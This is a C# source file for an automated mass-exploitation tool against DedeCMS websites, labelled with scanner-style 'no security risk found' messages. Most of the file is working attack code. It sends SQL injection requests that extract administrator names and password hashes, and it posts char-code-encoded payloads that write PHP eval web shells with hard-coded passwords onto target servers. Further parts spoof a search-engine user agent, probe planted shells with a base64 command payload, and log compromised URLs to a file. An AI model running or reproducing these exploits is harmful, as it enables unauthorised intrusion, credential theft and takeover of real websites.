using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
namespace windowsmanger
{
	internal class dedecms
	{
		private string localFilePath = "Good.txt";
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			string Getshhell = this.GetWebshell01(urls);
			if (Getshhell != "网站未发现安全隐患" && this.shujuhuoqulujing(Getshhell) != "网站未发现安全隐患")
			{
				this.DaochuGood(Getshhell);
				return Getshhell;
			}
			string zyeshuzhuru2 = this.zhimengzhuru0day1(urls);
			if (zyeshuzhuru2 != "网站未发现安全隐患")
			{
				return zyeshuzhuru2;
			}
			string getshellisok = this.GetWenshell(urls);
			if (getshellisok != "网站未发现安全隐患")
			{
				this.DaochuGood(getshellisok);
				return getshellisok;
			}
			string zyeshuzhuru3 = this.zhimengzhuru0day(urls);
			if (zyeshuzhuru3 != "网站未发现安全隐患")
			{
				return zyeshuzhuru3;
			}
			string yeshu = this.zhimengyijuhua(urls);
			if (yeshu != "")
			{
				return yeshu;
			}
			string names = this.getdename(urls);
			string pass = this.getdepass(urls);
			if (names == "" || pass == "")
			{
				return "网站未发现安全隐患";
			}
			return pass + "++" + names;
		}
		private string getdename(string url)
		{
			string name = null;
			try
			{
				HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + "/plus/search.php?typeArr[1%27%20or%20%60@\\%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20pwd%20from%20dede_admin%20limit%201,1%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20%27]=11&&kwtype=0&q=1111&searchtype=title");
				request.Method = "GET";
				HttpWebResponse response = (HttpWebResponse)request.GetResponse();
				string encoding = response.ContentEncoding;
				if (encoding == null || encoding.Length < 1)
				{
					encoding = "UTF-8";
				}
				StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
				string data = reader.ReadToEnd();
				response.Close();
				name = dedecms.RegexMatch(data, "(?<=Error infos: Duplicate entry ')([\\s\\S]*?)(?=' for key 'group_key')");
			}
			catch
			{
				name = "";
			}
			return name;
		}
		private string getdepass(string url)
		{
			string name = null;
			try
			{
				HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + "/plus/search.php?typeArr[1%27%20or%20%60@\\%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20uname%20from%20dede_admin%20limit%201,1%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20%27]=11&&kwtype=0&q=1111&searchtype=title");
				request.Method = "GET";
				HttpWebResponse response = (HttpWebResponse)request.GetResponse();
				string encoding = response.ContentEncoding;
				if (encoding == null || encoding.Length < 1)
				{
					encoding = "UTF-8";
				}
				StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
				string data = reader.ReadToEnd();
				response.Close();
				name = dedecms.RegexMatch(data, "(?<=Error infos: Duplicate entry ')([\\s\\S]*?)(?=' for key 'group_key')");
			}
			catch
			{
				name = "";
			}
			return name;
		}
		public static string RegexMatch(string txt, string RegexString)
		{
			string result;
			try
			{
				string MatchVale = string.Empty;
				Regex r = new Regex(RegexString, RegexOptions.IgnoreCase);
				Match i = r.Match(txt);
				if (i.Success)
				{
					MatchVale = i.Value;
				}
				result = MatchVale;
			}
			catch
			{
				result = null;
			}
			return result;
		}
		public string zhimengyijuhua(string url)
		{
			string exps = "/plus/mytag_js.php?aid=1&_COOKIE[GLOBALS][cfg_dbhost]=124.205.79.194&_COOKIE[GLOBALS][cfg_dbuser]=root&_COOKIE[GLOBALS][cfg_dbpwd]=xuegong&_COOKIE[GLOBALS][cfg_dbname]=xuegong&_COOKIE[GLOBALS][cfg_dbprefix]=dede_&nocache=true&QuickSearchBtn=爆菊花";
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			string shuju = new WebClient
			{
				Headers = 
				{

					{
						"user-agent",
						"Baiduspider"
					}
				},
				Encoding = Encoding.Default
			}.DownloadString(urls + exps);
			string shujuisok = "";
			if (shuju.Contains("OK"))
			{
				shujuisok = urls + "/plus/chevo.php+密码为x";
			}
			return shujuisok;
		}
		public string zhimengzhuru0day(string url)
		{
			string result;
			try
			{
				string urls = url;
				string expzhanshi = "/plus/search.php?keyword=as&typeArr[%20uNion%20]=a";
				string exp = "/plus/search.php?keyword=as&typeArr[111%3D@`\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\'`+]=a";
				string exp2 = "/plus/search.php?keyword=as&typeArr[111%3D@`\\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\\'`+]=a";
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				WebClient cli = new WebClient();
				cli.Headers.Add("user-agent", "Baiduspider");
				cli.Encoding = Encoding.Default;
				string shuju = cli.DownloadString(urls + expzhanshi);
				if (shuju.Contains("Safe Alert: Request Error step 1"))
				{
					string shuju2 = cli.DownloadString(urls + exp);
					cli.Headers.Add("user-agent", "Baiduspider");
					int kaishi = shuju2.IndexOf("Error infos: Duplicate entry '");
					string shuju3 = shuju2.Substring(kaishi + 30, 200);
					int jieshu = shuju2.IndexOf("'");
					string jieguo = shuju3.Substring(0, jieshu);
					result = jieguo;
				}
				else
				{
					if (shuju.Contains("Safe Alert: Request Error step 2"))
					{
						string shuju4 = cli.DownloadString(urls + exp2);
						if (shuju.Contains("Duplicate entry '"))
						{
							int kaishi2 = shuju4.IndexOf("Error infos: Duplicate entry '");
							string shuju5 = shuju4.Substring(kaishi2 + 30, 200);
							int jieshu2 = shuju4.IndexOf("'");
							string jieguo = shuju5.Substring(0, jieshu2);
							result = jieguo;
						}
						else
						{
							int kaishi3 = shuju4.IndexOf("/plus/view.php?aid=1");
							string shuju6 = shuju4.Substring(kaishi3, 200);
							int jieshu3 = shuju6.IndexOf("</a>");
							string name = shuju6.Substring(shuju6.IndexOf("/plus/view.php?aid=1") + 38, jieshu3 - shuju6.IndexOf("/plus/view.php?aid=1") - 38);
							string password = shuju6.Substring(shuju6.IndexOf("<p>") + 3, shuju6.IndexOf("</p>") - shuju6.IndexOf("<p>") - 3);
							result = name + "++" + password;
						}
					}
					else
					{
						result = "网站未发现安全隐患";
					}
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string zhimengzhuru0day1(string url)
		{
			string name = "";
			string pass = "";
			string urls = url;
			if (urls.Substring(0, 7).ToLower() != "http://")
			{
				urls = "http://" + urls;
			}
			WebClient client = new WebClient();
			string exp = "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294";
			new StringBuilder();
			string data = client.DownloadString(urls + exp);
			if (data.Contains("DedeCMS提示信息") || data.Contains("无法把未知文档推荐给好友") || data.Contains("安全狗") || data.Contains("DedeCMS鎻愮ず淇℃伅"))
			{
				return "网站未发现安全隐患";
			}
			if (data.Contains("鎺ㄨ崘") || data.Contains("推荐"))
			{
				int indexOp = data.IndexOf("<title>") + 11;
				int indexEnd = data.IndexOf("_{dede");
				data = data.Substring(indexOp, indexEnd - indexOp);
				string[] adminpass = data.Split(new char[]
				{
					'|'
				});
				name = adminpass[0];
				pass = adminpass[1];
				if (name == "" || pass == "")
				{
					return data;
				}
			}
			return name + "++" + pass;
		}
		public string GetWenshell(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			WebClient cli = new WebClient();
			cli.Headers.Add("user-agent", "Baiduspider");
			cli.Encoding = Encoding.Default;
			string result;
			try
			{
				string exp = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=49&arrs2[]=49&arrs2[]=49&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=104&arrs2[]=111&arrs2[]=110&arrs2[]=103&arrs2[]=102&arrs2[]=101&arrs2[]=110&arrs2[]=103&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=121&arrs2[]=105&arrs2[]=106&arrs2[]=105&arrs2[]=97&arrs2[]=110&arrs2[]=109&arrs2[]=101&arrs2[]=105&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96";
				cli.DownloadString(urls + exp);
				try
				{
					string exp2 = "/plus/mytag_js.php?aid=11113";
					cli.DownloadString(urls + exp2);
					try
					{
						cli.DownloadString(urls + "/plus/hongfeng.php");
						result = urls + "/plus/hongfeng.php  密码 yijianmei";
					}
					catch
					{
						result = "网站未发现安全隐患";
					}
				}
				catch
				{
					result = "网站未发现安全隐患";
				}
			}
			catch
			{
				try
				{
					string exp3 = "/plus/mytag_js.php?aid=11113";
					cli.DownloadString(urls + exp3);
					try
					{
						cli.DownloadString(urls + "/plus/hongfeng.php");
						result = urls + "/plus/hongfeng.php  密码 yijianmei";
					}
					catch
					{
						result = "网站未发现安全隐患";
					}
				}
				catch
				{
					result = "网站未发现安全隐患";
				}
			}
			return result;
		}
		public string GetWebshell01(string url)
		{
			string str = new WebClient
			{
				Headers = 
				{
					"tijiao: 90sec",
					"Cookie: xxxx;"
				}
			}.DownloadString(url + "/plus/mytag_js.php");
			if (!str.Contains("Error!"))
			{
				return "网站未发现安全隐患";
			}
			string postString = "dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0";
			byte[] postData = Encoding.UTF8.GetBytes(postString);
			string urls = url + "/plus/erraddsave.php";
			byte[] responseData = new WebClient
			{
				Headers = 
				{

					{
						"Content-Type",
						"application/x-www-form-urlencoded"
					},

					{
						"user-agent",
						"Baiduspider"
					}
				}
			}.UploadData(urls, postData);
			string scrString = Encoding.UTF8.GetString(responseData);
			if (scrString.Contains("DedeCMS"))
			{
				return url + "/plus/mytag_js.php?aid=9090";
			}
			return "网站未发现安全隐患";
		}
		public void DaochuGood(string url)
		{
			try
			{
				if (!File.Exists(this.localFilePath))
				{
					FileStream fs = new FileStream(this.localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(this.localFilePath, true);
					sw.WriteLine(url);
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(this.localFilePath, true);
					sw2.WriteLine(url);
					sw2.Close();
				}
			}
			catch
			{
			}
		}
		public string huoquwenjian(string url, string wenjian, string mima)
		{
			string result;
			try
			{
				this.shujuhuoqulujing(url);
				result = "成功";
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string Base64jiami(string baser64)
		{
			byte[] bytes = Encoding.Default.GetBytes(baser64);
			return Convert.ToBase64String(bytes);
		}
		public string UrlEncode(string Urlencode)
		{
			return HttpUtility.UrlEncode(Urlencode);
		}
		public string SubMulu(string url)
		{
			string getDomain = url;
			if (getDomain.Contains("http://"))
			{
				getDomain = getDomain.Replace("http://", "");
				getDomain = getDomain.Substring(getDomain.IndexOf("/") + 1, getDomain.LastIndexOf("/") - getDomain.IndexOf("/") - 1);
			}
			return getDomain;
		}
		public string shujuhuoqulujing(string url)
		{
			string result;
			try
			{
				string postString = "guige=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D";
				byte[] postData = Encoding.UTF8.GetBytes(postString);
				byte[] responseData = new WebClient
				{
					Headers = 
					{

						{
							"Content-Type",
							"application/x-www-form-urlencoded"
						},

						{
							"user-agent",
							"Baiduspider"
						}
					}
				}.UploadData(url, postData);
				string scrString = Encoding.UTF8.GetString(responseData);
				string jieguo;
				if (scrString.Contains("Windows"))
				{
					if (scrString.Contains("\tC"))
					{
						jieguo = scrString.Substring(scrString.IndexOf("|") + 1, scrString.IndexOf("\t") - 1 - scrString.IndexOf("|"));
					}
					else
					{
						jieguo = scrString.Substring(scrString.IndexOf("|") + 1, scrString.IndexOf("Windows") - 2 - scrString.IndexOf("|"));
					}
				}
				else
				{
					if (scrString.Contains("Linux"))
					{
						jieguo = scrString.Substring(scrString.IndexOf("|") + 1, scrString.IndexOf("Linux") - 2 - scrString.IndexOf("|"));
					}
					else
					{
						jieguo = scrString.Substring(scrString.IndexOf("|") + 1, scrString.IndexOf("\t") - 2 - scrString.IndexOf("|"));
					}
				}
				result = jieguo.Trim();
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
